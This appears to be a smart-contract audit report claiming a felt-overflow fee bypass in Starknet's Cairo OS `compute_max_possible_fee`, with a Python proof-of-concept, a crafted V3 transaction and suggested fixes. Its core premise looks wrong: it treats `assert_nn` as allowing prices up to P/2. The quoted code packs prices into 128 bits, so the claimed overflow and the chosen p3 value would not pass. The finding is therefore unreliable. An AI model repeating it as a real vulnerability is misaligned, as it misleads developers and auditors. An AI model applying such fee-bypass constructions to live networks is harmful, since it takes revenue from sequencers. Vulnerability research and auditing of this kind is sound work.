### Title
Felt Arithmetic Overflow in `compute_max_possible_fee` Enables Complete Fee Bypass — (File: `execution/transaction_impls.cairo`)

---

### Summary

The `compute_max_possible_fee` function in `transaction_impls.cairo` computes the maximum chargeable fee using raw Cairo felt arithmetic (modular arithmetic mod P ≈ 2²⁵¹). Because individual resource-bound fields are only range-checked independently — not their products or their sum — an attacker can craft a V3 transaction whose resource bounds cause the entire fee expression to wrap to exactly `0` modulo P. When `max_fee == 0`, `charge_fee` returns immediately without executing any ERC-20 transfer, granting the attacker a fully fee-free transaction execution.

---

### Finding Description

`compute_max_possible_fee` is defined at: [1](#0-0) 

```cairo
func compute_max_possible_fee(tx_info: TxInfo*) -> felt {
    ...
    return l1_gas_bounds.max_amount * l1_gas_bounds.max_price_per_unit
         + l2_gas_bounds.max_amount * (l2_gas_bounds.max_price_per_unit + tx_info.tip)
         + l1_data_gas_bounds.max_amount * l1_data_gas_bounds.max_price_per_unit;
}
```

All arithmetic is felt arithmetic — every operation is implicitly reduced modulo the Cairo field prime P. The only per-field constraints enforced by the OS are:

- `max_amount ≤ 2⁶⁴ − 1` — checked via `assert_nn_le` in `pack_resource_bounds`
- `max_price_per_unit ∈ [0, P/2)` — checked via `assert_nn` in `pack_resource_bounds`
- `tip ≤ 2⁶⁴ − 1` — checked via `assert_nn_le` in `hash_fee_fields` [2](#0-1) [3](#0-2) 

These bounds are **not sufficient** to prevent overflow of the products. The maximum value of a single product is:

```
(2⁶⁴ − 1) × (P/2) ≈ 2⁶⁴ × 2²⁵⁰ = 2³¹⁴
```

This is approximately 2⁶³ times larger than P, meaning the product wraps around the field prime ~2⁶³ times. The sum of three such products can be crafted to equal exactly `0 mod P`.

The result is consumed immediately in `charge_fee`: [4](#0-3) 

```cairo
let max_fee = compute_max_possible_fee(tx_info=tx_info);

if (max_fee == 0) {
    return ();   // ← fee charging skipped entirely
}
...
assert_nn_le(calldata.amount.low, max_fee);
```

When `max_fee` wraps to `0`, the early-return branch fires and no ERC-20 transfer is executed. The sequencer receives nothing.

---

### Impact Explanation

**Direct loss of funds.** The sequencer is entitled to collect fees for every non-zero-fee transaction it executes. When `max_fee` wraps to `0` due to felt overflow, the OS Cairo program skips the fee-transfer call entirely. The sequencer's fee-token balance is not credited, constituting a direct, permanent loss of the fee revenue for every such transaction included in a block. Because the OS proof enforces this path, no off-chain sequencer logic can override it after the fact.

---

### Likelihood Explanation

The attack is fully deterministic and requires no privileged access. An attacker needs only to:

1. Know the Cairo field prime P (public).
2. Solve the linear congruence `A + B + C ≡ 0 (mod P)` subject to the individual bounds — a trivial computation (e.g., fix two terms, solve for the third using modular inverse).
3. Submit a valid V3 transaction (invoke, declare, or deploy-account) with the crafted resource bounds.

The transaction passes all OS-enforced hash and signature checks because the resource-bound values individually satisfy their range constraints. The overflow only manifests when the products are summed inside `compute_max_possible_fee`. No special role, leaked key, or network-level capability is required.

---

### Recommendation

Replace the raw felt multiplication-and-addition in `compute_max_possible_fee` with an overflow-safe computation. Two concrete options:

1. **Bound `max_price_per_unit` tightly.** Add `assert_nn_le(resource_bounds.max_price_per_unit, MAX_PRICE_PER_UNIT)` in `pack_resource_bounds` where `MAX_PRICE_PER_UNIT` is chosen so that `(2⁶⁴ − 1) × MAX_PRICE_PER_UNIT × 3 < P`. For example, `MAX_PRICE_PER_UNIT = 2¹²⁸` keeps the total sum well below P.

2. **Post-computation range check.** After computing `max_fee`, assert it is within a sane range:
   ```cairo
   assert_nn_le(max_fee, MAX_REALISTIC_FEE);
   ```
   This catches any wrap-around and reverts the transaction rather than silently zeroing the fee. [2](#0-1) 

---

### Proof of Concept

Let P = Cairo field prime = `0x800000000000011000000000000000000000000000000000000000000000001`.

**Goal:** find `(a1, p1, a2, p2, tip, a3, p3)` satisfying all OS bounds such that:
```
a1*p1 + a2*(p2 + tip) + a3*p3 ≡ 0  (mod P)
```

**Concrete construction:**

```python
P = 0x800000000000011000000000000000000000000000000000000000000000001

# Fix two terms to be non-zero, solve for the third.
a1 = 1;  p1 = 1          # product_1 = 1
a2 = 1;  p2 = 1; tip = 0 # product_2 = 1
# Need a3*p3 ≡ P - 2  (mod P), i.e., a3*p3 = P - 2 as integers.
# Choose a3 = 1, p3 = P - 2.
# Check: p3 = P - 2 < P/2? No — P-2 > P/2.
# So instead: a3 = 2, p3 = (P-2) * inverse(2, P) mod P
#           = (P-2)/2 mod P  (P is odd, so 2 is invertible)
#           = (P-2) * ((P+1)//2) mod P
inv2 = (P + 1) // 2
p3 = ((P - 2) * inv2) % P
a3 = 2
# Verify p3 < P//2 (assert_nn passes): p3 = (P-2)/2 ≈ P/2 - 1 < P/2 ✓
# Verify a3 <= 2^64-1: 2 ✓
# Total: 1 + 1 + 2*p3 = 2 + (P-2) = P ≡ 0 (mod P) ✓
```

**Attack transaction (V3 invoke):**
```json
{
  "type": "INVOKE",
  "version": "0x3",
  "resource_bounds": {
    "l1_gas":      { "max_amount": "0x1", "max_price_per_unit": "0x1" },
    "l2_gas":      { "max_amount": "0x1", "max_price_per_unit": "0x1" },
    "l1_data_gas": { "max_amount": "0x2", "max_price_per_unit": "<p3>" }
  },
  "tip": "0x0",
  ...
}
```

**Execution trace:**
1. OS calls `compute_max_possible_fee` → result = `1 + 1 + 2*p3 mod P = P mod P = 0`.
2. `charge_fee` checks `if (max_fee == 0) { return (); }` → returns immediately.
3. No ERC-20 transfer is executed. Sequencer receives zero fee.
4. Transaction execution proceeds normally; attacker's contract call completes for free. [5](#0-4) [6](#0-5)

### Citations

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/transaction_impls.cairo (L87-102)
```text
func compute_max_possible_fee(tx_info: TxInfo*) -> felt {
    tempvar resource_bounds: ResourceBounds* = tx_info.resource_bounds_start;
    let n_resource_bounds = (tx_info.resource_bounds_end - resource_bounds) / ResourceBounds.SIZE;

    // Only V3 transactions with all resource bounds are supported.
    assert tx_info.version = 3;
    assert n_resource_bounds = 3;

    tempvar l1_gas_bounds: ResourceBounds = resource_bounds[L1_GAS_INDEX];
    tempvar l2_gas_bounds: ResourceBounds = resource_bounds[L2_GAS_INDEX];
    tempvar l1_data_gas_bounds = resource_bounds[L1_DATA_GAS_INDEX];

    return l1_gas_bounds.max_amount * l1_gas_bounds.max_price_per_unit + l2_gas_bounds.max_amount *
        (l2_gas_bounds.max_price_per_unit + tx_info.tip) + l1_data_gas_bounds.max_amount *
        l1_data_gas_bounds.max_price_per_unit;
}
```

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/transaction_impls.cairo (L121-135)
```text
    let max_fee = compute_max_possible_fee(tx_info=tx_info);

    if (max_fee == 0) {
        return ();
    }

    local low_actual_fee;
    %{ LoadActualFee %}
    local calldata: TransferCallData = TransferCallData(
        recipient=block_context.block_info_for_execute.sequencer_address,
        amount=Uint256(low=low_actual_fee, high=0),
    );

    // Verify that the charged amount is not larger than the transaction's max_fee field.
    assert_nn_le(calldata.amount.low, max_fee);
```

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/transaction_hash/transaction_hash.cairo (L103-108)
```text
func pack_resource_bounds{range_check_ptr}(resource_bounds: ResourceBounds) -> felt {
    assert_nn_le(resource_bounds.max_amount, 2 ** 64 - 1);
    assert_nn(resource_bounds.max_price_per_unit);
    return (resource_bounds.resource * 2 ** 64 + resource_bounds.max_amount) * 2 ** 128 +
        resource_bounds.max_price_per_unit;
}
```

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/transaction_hash/transaction_hash.cairo (L117-117)
```text
    assert_nn_le(tip, 2 ** 64 - 1);
```
